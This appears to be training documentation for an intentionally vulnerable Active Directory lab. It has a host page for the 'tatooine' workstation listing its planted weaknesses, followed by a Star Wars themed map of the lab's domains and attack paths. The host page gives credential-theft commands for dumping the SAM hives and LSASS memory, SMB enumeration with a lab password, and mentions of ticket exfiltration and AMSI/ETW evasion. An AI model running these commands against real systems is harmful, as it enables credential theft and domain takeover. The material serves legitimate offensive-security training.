# tatooine.empire.local — 10.10.0.100

The **victim workstation**. This is where phishing lands, where users' tokens live in LSASS, where coercion drops bait files, and where almost every local LPE primitive is wired up. **No attacker tools are pre-installed for you** — drop your own once you land here.

## Listening ports

| Port | Proto | Service | Notes |
|---|---|---|---|
| 135/139/445 | TCP | RPC + SMB | **SMB signing OFF (client + server)** → relay viable |
| 3389 | TCP | RDP | NLA default |
| 5985 | TCP | WinRM | |

## Shares + bait files

| Share | Bait | Purpose |
|---|---|---|
| `PublicShare` (C:\Shared) | `HR-Documents.scf`, `Quarterly-Report.url`, `Quarterly-Reports.library-ms` | NTLM leak when previewed (CVE-2025-24071, .scf, .url) |
| `IPC$` | — | session enumeration |

## Delegation

- `tatooine$` **TRUSTED_FOR_DELEGATION** (unconstrained) — TGTs of every user who logs in get cached in LSASS

## Local LPE / cred-access primitives

| Vector | Wired |
|---|---|
| `AlwaysInstallElevated` | HKLM + HKCU set (PE-008) |
| UAC bypass | `ConsentPromptBehaviorAdmin=0` |
| SAM/SYSTEM/SECURITY readable by Users | yes (CRED-006) — `reg save` without SeBackup |
| `CorpSync` scheduled task with `C:\VulnTasks` Users:F | yes (PE-005) |
| Vulnerable-driver staging dir `C:\EMPIRE\drivers` | yes (BYOVD) |
| Pre-staged ADIDNS A record `new-fileserver.empire.local → 10.10.0.100` | yes (PER-030) |

## Minimum enum sweep (after landing here via phishing/RCE/LPE)

```cmd
:: identity
whoami /all
:: signing
reg query "HKLM\System\CurrentControlSet\Services\LanmanServer\Parameters" /v RequireSecuritySignature
:: AIE
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
:: SAM dump (no SeBackup needed — files are readable)
reg save HKLM\SAM C:\Temp\sam
reg save HKLM\SYSTEM C:\Temp\system
reg save HKLM\SECURITY C:\Temp\security
:: LSASS via MiniDumpWriteDump (no mimikatz needed)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <pid_lsass> C:\Temp\lsass.dmp full
:: Tickets in memory (will include other interactive users' TGTs because unconstrained)
:: -> exfil and Pass-the-Ticket
:: Token / Potato
whoami /priv | findstr Impersonate
```

## From Kali, before landing

```bash
W=10.10.0.100
nxc smb $W -u peter.parker -p 'EmpireLab2024!' --shares
nxc smb $W -u peter.parker -p 'EmpireLab2024!' --loggedon-users   # see who's there
# Hash-leak via bait file:
smbclient //$W/PublicShare -U peter.parker%'EmpireLab2024!' -c 'get HR-Documents.scf'
# Phishing landing scenarios:
#   • email with .library-ms in ZIP (IA-024)
#   • .lnk in PublicShare → user double-clicks (IA-020)
#   • .url file (PerSession NTLM leak)
```

## Forward to

IA-019..028 (phishing/LPE entry vectors), CRED-005/006/010 (LSASS / SAM / token), PE-008/005, CRED-018 (TGTs in LSASS due to unconstrained), LAT-005 (pivot back into corp from this beachhead).

---

# The EMPIRE AD Lab: Star Wars Lore & Thematic Mapping

Welcome to the **EMPIRE AD Lab**, where the intricacies of Active Directory align with the galactic struggle between the Galactic Empire, the Rebel Alliance, and the shadow syndicates. This section provides a conceptual thematic mapping between the AD concepts you are attacking and the Star Wars universe.

## The Galactic Topology

The lab topology represents the political structure of the galaxy. Just as trust relationships govern AD, diplomatic and military alliances govern the galaxy.

```mermaid
graph TD
    classDef empire fill:#000000,stroke:#ff0000,stroke-width:2px,color:#fff;
    classDef rebel fill:#2b5c8f,stroke:#ff9900,stroke-width:2px,color:#fff;
    classDef trade fill:#4a4a4a,stroke:#aaaaaa,stroke-width:2px,color:#fff;
    classDef highlight fill:#440000,stroke:#ff0000,stroke-width:3px,color:#fff;

    subgraph The Galactic Empire (empire.local)
        Coruscant["Coruscant (Root DC)<br/>coruscant.empire.local"]:::empire
        DeathStar["The Death Star (Child DC)<br/>deathstar.eu.empire.local"]:::highlight
        Scarif["Scarif Citadel (File Server)<br/>scarif.empire.local"]:::empire
        Kamino["Kamino Cloning Facility (SQL)<br/>kamino.empire.local"]:::empire
        Endor["Endor Shield Generator (CA)<br/>endor.empire.local"]:::empire
        Mandalore["Mandalore Mercenary Base (Linux)<br/>mandalore.empire.local"]:::empire
        Coruscant -- "Imperial Command" --> DeathStar
        Coruscant --- Scarif
        Coruscant --- Kamino
        Coruscant --- Endor
        Coruscant --- Mandalore
    end

    subgraph The Rebel Alliance (rebel.local)
        Yavin4["Yavin 4 Base<br/>yavin4.rebel.local"]:::rebel
    end

    subgraph The Trade Federation (trade.corp)
        Neimoidia["Cato Neimoidia<br/>neimoidia.trade.corp"]:::trade
    end

    Coruscant <-->|Espionage / External Trust| Yavin4
    Coruscant <-->|Treaty / Forest Trust| Neimoidia
```

## Infrastructure Mapping

Understanding the infrastructure is key to successfully executing your attack paths. Here is how the technical components of the EMPIRE AD lab map to the Star Wars universe:

### 1. The Core Domains
* **`empire.local` (The Galactic Empire):** The central root domain. This is the seat of the Emperor and the Imperial Senate. Taking over this domain is equivalent to taking over Coruscant. It controls all the core infrastructure.
* **`eu.empire.local` (The Death Star):** A child domain of `empire.local`. While it reports to the root domain, it holds immense power. Escaping the child domain to compromise the root domain is the equivalent of using the Death Star plans to destroy the Empire.
* **`rebel.local` (The Rebel Alliance):** An external forest. It has an external trust with the Empire (perhaps through espionage or captured spies). Moving laterally across this trust requires finding a weak link in the Rebel defenses.
* **`trade.corp` (The Trade Federation):** A separate forest with a bidirectional forest trust. The Empire uses them for resources, but you can forge trust tickets (Inter-Realm TGTs) to cross this boundary.

### 2. High-Value Targets (Servers)
* **`coruscant.empire.local` (Coruscant Root DC):** The ultimate prize. Achieving Domain Admin here gives you the keys to the galaxy.
* **`endor.empire.local` (Endor Shield Generator / ADCS):** Active Directory Certificate Services. If you can compromise the CA (via ESC1, ESC8, etc.), you can forge certificates for any user in the Empire, effectively bringing down the deflector shields.
* **`scarif.empire.local` (Scarif Citadel):** This file server hosts critical SMB shares. It is the repository of the Death Star plans. Look for exposed passwords in scripts or configuration files left by careless Imperial engineers.
* **`kamino.empire.local` (Kamino Facility):** The SQL Server. SQL injection or xp_cmdshell here can lead to a foothold. It represents the cloning facilities—a hidden source of power.
* **`mandalore.empire.local` (Mandalore Base):** The Linux-in-AD member. Contains local privilege escalations and cross-OS pivot opportunities. Represents the mercenary faction employed by the Empire.

### 3. Attack Paths and Tactics
* **Initial Access (The Smuggler's Route):** Finding an exposed SMB share or exploiting an LLMNR poisoning vulnerability (Responder) is like slipping past the Imperial blockade.
* **Kerberoasting (Bounty Hunting):** Requesting TGS tickets for service accounts and cracking them offline is like putting a bounty on a high-value target and cracking their encryption.
* **DCSync (The Force):** Using `secretsdump` to pull the `krbtgt` hash directly from the Domain Controller. It's an invisible, powerful attack that bypasses normal defenses.
* **Golden Ticket (Order 66):** Once you have the `krbtgt` hash, you can forge a TGT for any user, granting you infinite access. It is the ultimate executive order, overriding all security protocols.
* **Trust Abuse (Diplomatic Immunity):** Forging a trust ticket to cross from the Child Domain to the Root Domain.

## The Hacker's Code (Sith vs Jedi)
As you navigate the lab, remember that the tools you use define your path. Will you use noisy, aggressive tools (The Dark Side) that trigger every alarm, or will you use stealthy, precise tradecraft (The Light Side) to move undetected?

* **The Dark Side (Noisy):** Running `BloodHound` with all collection methods, spraying passwords across the entire domain, and dropping standard Mimikatz binaries to disk. It is powerful and fast, but leaves a massive trail.
* **The Light Side (Stealthy):** Targeted LDAP queries, memory-only execution via Covenant or Cobalt Strike, and careful evasion of logging (AMSI bypasses, ETW patching).

## Flag Locations (Holocrons)
Hidden throughout the EMPIRE AD lab are flags (Holocrons) that prove your mastery over the environment. Look for `FLAG-*.txt` files on desktops, hidden SMB shares, and within the SQL databases. 

**Remember:** 
* "Your focus determines your reality." - Qui-Gon Jinn. Focus on the attack paths mapped out in `PLAN.md`.
* "I find your lack of faith disturbing." - Darth Vader. If an exploit fails, check your syntax, your targeting, and the underlying misconfiguration. The lab is intentionally vulnerable.

May the Force be with you as you conquer the EMPIRE AD!
